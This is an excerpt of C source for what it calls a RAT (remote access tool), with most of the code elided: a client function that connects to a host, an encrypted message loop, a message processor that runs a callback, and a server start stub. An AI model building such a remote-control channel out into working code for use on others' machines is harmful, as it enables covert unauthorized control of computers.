...
int connect_rat(const char* hostname, int port) {
  ...
  if (strcmp(readln(soc), CONNECT_ACK) == 0) {
    ...
    while (1) {
      ...
      const char* encryptd_msg = rat_encrypt(msg);
      writeln(soc, encryptd_msg, strlen(encryptd_msg));
      printf("%s\n", rat_decrypt(readln(soc)));
    }
  }
  return 0;
}
...
void process(const char* msg, int soc) {
  int count = 0;
  const char* decryptd_msg = rat_decrypt(msg);
  ...
  const char* output = rat_encrypt(cb(count, args));
...
int start_rat(int port) {
  ...
  /*while(1) */
  {
    ...
    // else
    //   return start_rat(port); //FIXME use seperate process or
    //   threads(controlled)
  }
